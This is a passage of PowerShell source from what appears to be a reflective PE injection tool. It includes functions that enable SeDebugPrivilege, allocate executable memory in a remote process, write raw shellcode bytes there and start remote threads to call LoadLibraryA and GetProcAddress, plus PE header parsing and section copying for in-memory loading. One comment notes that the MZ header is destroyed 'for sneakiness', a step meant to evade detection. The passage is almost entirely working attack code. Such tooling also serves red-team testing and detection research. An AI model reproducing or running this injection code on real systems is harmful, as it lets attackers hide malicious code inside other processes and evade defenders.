				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
